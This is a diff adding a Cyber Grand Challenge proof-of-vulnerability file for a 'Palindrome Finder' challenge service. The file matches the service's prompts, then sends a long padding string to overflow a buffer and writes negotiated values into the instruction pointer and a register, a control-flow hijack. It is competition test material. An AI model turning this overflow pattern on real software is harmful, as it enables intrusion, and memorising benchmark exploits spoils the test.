@@ -1,0 +1,28 @@
+<?xml version="1.0" standalone="no" ?>
+<!DOCTYPE pov SYSTEM "/usr/share/cgc-docs/cfe-pov.dtd">
+<cfepov>
+    <cbid>service</cbid>
+    <replay>
+    <negotiate>
+        <type1>
+            <ipmask>0xFFFFFFFF</ipmask>
+            <regmask>0xFFFFFFFF</regmask>
+            <regnum>0</regnum>
+        </type1> 
+    </negotiate>
+
+    <read><delim>\x0a</delim><match><data>\x0a</data></match></read>
+    <read><delim>\x0a</delim><match><data>Welcome to Palindrome Finder\x0a</data></match></read>
+    <read><delim>\x0a</delim><match><data>\x0a</data></match></read>
+    <read><length>37</length><match><data>\x09Please enter a possible palindrome: </data></match></read>
+        <write>
+	    <data>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</data>
+	</write>
+
+    <!-- write the value intended to end up in EIP -->
+    <write><var>TYPE1_IP</var></write>
+    <!-- write the value intended to end up in any other GPR -->
+    <write><var>TYPE1_REG</var></write>
+
+    </replay>
+</cfepov>
